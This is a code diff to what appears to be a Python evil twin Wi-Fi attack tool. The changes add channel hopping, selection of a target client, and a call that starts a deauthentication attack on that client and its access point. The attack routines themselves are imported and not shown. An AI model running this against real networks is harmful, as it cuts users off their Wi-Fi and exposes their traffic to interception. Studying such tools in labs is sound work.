@@ -7,6 +7,8 @@ import attack
 
 
 def exit_and_cleanup(exit_code, message):
+    print_regular('Perform cleanup')
+    os.system('sudo ./cleanup.sh')
     sys.exit('{} Perform exit() with exit code {} , {}'.format(Fore.WHITE, exit_code, message))
 
 
@@ -55,18 +57,19 @@ def handle_user_result():
         Fore.BLUE))
 
 
-def channel_changing(interface: str, timeout_seconds):
+def channel_changing(interface: str, timeout_seconds, channel: int = 1):
     """
     This function changing the channel searching. (to identify networks and clients that uses other channels)
     :param timeout_seconds: function timeout
     :param interface: the interface that used to identify the networks / clients. (wlan0 for example)
+    :param channel: the starting channel default is 1.
     :return:
     """
     start_time = datetime.now()
-    channel = 1
+    channel = channel
     while (datetime.now() - start_time).seconds < timeout_seconds:
+        print('channel is {}'.format(channel))
         channel = (channel + 1) % 14
-        print('ch is {}', channel)
         bash('iwconfig {} channel {}'.format(interface, channel))
         time.sleep(1)
 
@@ -77,7 +80,15 @@ def start_evil_twin_attack():
     ap = attack.get_ap(ap_index)
     if ap is None:
         exit_and_cleanup(-1, '{}general error ap is None'.format(Fore.RED))
-    print_regular('Network to Attack : AP Name = {}  MAC Address = {}'.format(ap[0], ap[1]))
+    print_regular('Network to Attack : AP Name = {}  MAC Address = {}\n'.format(ap[0], ap[1]))
+    print_regular(
+        'Searching for users in all channels on Network to Attack : AP Name = {}  MAC Address = {}\n'.format(ap[0],
+                                                                                                           ap[1]))
+    client_index = attack_obj.get_client_index(ap)
+    client = attack.get_client(client_index)
+    print_header('deauthentication attack')
+    print_regular('Perform deauthentication attack on Client MAC Address = {} and AP Name = {}\n'.format(client, ap[1]))
+    attack_obj.deauthentication_attack(client, ap[1])
 
 
 def manage():
